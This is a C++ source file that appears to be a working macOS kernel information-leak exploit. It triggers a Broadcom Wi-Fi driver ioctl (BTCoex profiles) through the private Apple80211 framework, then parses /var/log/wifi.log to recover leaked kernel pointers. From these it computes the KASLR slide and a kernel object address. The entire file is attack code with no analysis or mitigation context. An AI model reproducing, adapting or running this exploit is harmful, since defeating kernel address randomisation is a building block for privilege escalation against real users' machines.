// clang++ *.cpp -o leak -framework CoreFoundation -framework IOKit
#include "import.h"

uint64_t func_addr = 0;
uint64_t kslide = 0;
uint64_t kern_obj_addr = 0;

lsym_map_t* mapping_kernel;
void *libHandle;
int (*apple80211Open)(void *);
int (*apple80211Bind)(void *, CFStringRef);
int (*apple80211Close)(void *);

lsym_slidden_kern_pointer_t lsym_slide_pointer(lsym_kern_pointer_t pointer) {
    if (!pointer) return pointer;
    return (lsym_slidden_kern_pointer_t) pointer + kslide;
}

uint64_t Apple80211Get(Apple80211Ref handle, uint32_t type, void * data, uint32_t length)
{
    struct apple80211_ioctl_str re;
    memset(&re, '\0', sizeof(re));
    strncpy(re.ifname, handle->interfaceName, 16);
    re.type   = type;
    re.length = length;
    re.data   = data;
    uint32_t ret = ioctl(handle->socket, APPLEGET, re);
    return ret;
}
uint32_t Apple80211Set(Apple80211Ref handle, uint32_t type, void * data, uint32_t length)
{
    struct apple80211_ioctl_str re;
    memset(&re, '\0', sizeof(re));
    strncpy(re.ifname, handle->interfaceName, 16);
    re.type   = type;
    re.length = length;
    re.data   = data;
    uint32_t ret = ioctl(handle->socket, APPLESET, re);
    return 0;
}

// leak
uint32_t setBTCoexProfiles_leak(Apple80211Ref handle)
{
    unsigned char buf[0x23C];
    uint32_t * p = (uint32_t *)buf;
    p[2] = 14; 
    uint32_t ret = Apple80211Set(handle, 221, buf,sizeof(buf));
    return ret;
}

bool leak_func(Apple80211Ref handle)
{
    bool ret = false;
    unsigned char buffer[0x800];
    setBTCoexProfiles_leak(handle);
    FILE * fd = fopen("/var/log/wifi.log", "r");
    uint32_t right = 0;
    uint32_t left = 0;
    fseek(fd, -0x800, SEEK_END);
    while(fscanf(fd, "%s", buffer ) > 0)
    {
        if(strcmp("Profile[13]:",(const char *)buffer) == 0)
        {
            fscanf(fd, "%s", buffer);
            fscanf(fd, "%s", buffer);
            fscanf(fd, "%s", buffer);
            fscanf(fd, "%s", buffer);
            if(!(fscanf(fd, "%u", &right) > 0))
            {
                continue;
            }
            fscanf(fd, "%s", buffer);
            if(!(fscanf(fd, "%u", &left) > 0))
            {
                continue;
            }
            func_addr = ((uint64_t)left << 32) + right;
            uint64_t kern_addr = 0;
            kern_addr = RESOLVE_SYMBOL(mapping_kernel, "_ifioctllocked");
            printf("func_addr : 0x%llx\n", func_addr );
            printf("kern_return_addr : 0x%llx\n", kern_addr );
            uint64_t temp = (func_addr & 0xfffffffffffff000)-(kern_addr & 0xfffffffffffff000);
            if( temp != 0)
            {
                kslide = temp;
                printf("kslide : 0x%llx\n",kslide );
                ret = true;
                break;
            }
        }
    }
    if(ret)
    {
        fseek(fd, -0x800, SEEK_END);
        while(fscanf(fd, "%s", buffer ) > 0)
        {
            // printf("%s\n",buffer );
            if(strcmp("Profile[5]:",(const char *)buffer) == 0)
            {
                fscanf(fd, "%s", buffer);
                fscanf(fd, "%s", buffer);
                fscanf(fd, "%s", buffer);
                fscanf(fd, "%s", buffer);
                fscanf(fd, "%s", buffer);
                fscanf(fd, "%s", buffer);
                if(!(fscanf(fd, "%u", &right) > 0))
                {
                    continue;
                }
                fscanf(fd, "%s", buffer);
                if(!(fscanf(fd, "%u", &left) > 0))
                {
                    continue;
                }
                if(((uint64_t)left << 32) + right != 0)
                {
                    kern_obj_addr = ((uint64_t)left << 32) + right;
                    printf("k_object pointer : 0x%llx\n", kern_obj_addr);
                    fclose(fd);
                    return true;
                }
            }
        }
        fclose(fd);
        return false;
    }
    else
    {
        fclose(fd);
        return false;
    }
}

bool setting()
{
    kern_return_t c;
    sync();
    mapping_kernel = lsym_map_file("/mach_kernel");
    if (!mapping_kernel || !mapping_kernel->map) {
        mapping_kernel = lsym_map_file("/System/Library/Kernels/kernel");
    }
    if(!mapping_kernel)
    {
        return false;
    }
    libHandle = dlopen("/System/Library/PrivateFrameworks/Apple80211.framework/Apple80211", 0x1);
    apple80211Open = (int (*)(void *) ) dlsym(libHandle, "Apple80211Open");
    apple80211Bind = (int (*)(void *, CFStringRef)) dlsym(libHandle, "Apple80211BindToInterface");
    apple80211Close = (int (*)(void *)) dlsym(libHandle, "Apple80211Close");
    return true;
}

int main(int argc, char * argv[0])
{
    io_iterator_t iters;
    kern_return_t error;
    io_name_t className;
    io_service_t entry;

    printf("Prepare\n");
    error = IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AirPort_BrcmNIC_Interface"), &iters);
    if(error)
    {
        return -1;
    }
    entry = IOIteratorNext(iters);
    error = IOObjectGetClass(entry, className);

    char if_name[4096] = {0};
    uint32_t size = sizeof(if_name);
    if(IORegistryEntryGetProperty(entry, "BSD Name", if_name, &size))
    {
        printf("fail bsd Name\n");
        return -1;
    }
    printf("ifname: %s \n", if_name);

    Apple80211Ref handle;
    CFStringRef en0ifName;
    
    if(!setting())
    {
        return -1;
    }
    int rc = apple80211Open(&handle);
    if (rc) 
    { 
        fprintf(stderr, "apple80211Open failed..\n"); 
    }

    en0ifName = CFStringCreateWithCStringNoCopy(NULL, (const char *)if_name, kCFStringEncodingMacRoman, NULL);
    rc = apple80211Bind(handle, en0ifName);
    if (rc) 
    {
        fprintf(stderr, "iterface bind failed..\n");
        return -1;
    }
    
    bool ret = false;
    do
    {
        ret = leak_func(handle);
    }while(ret != true);
    return ret;
}
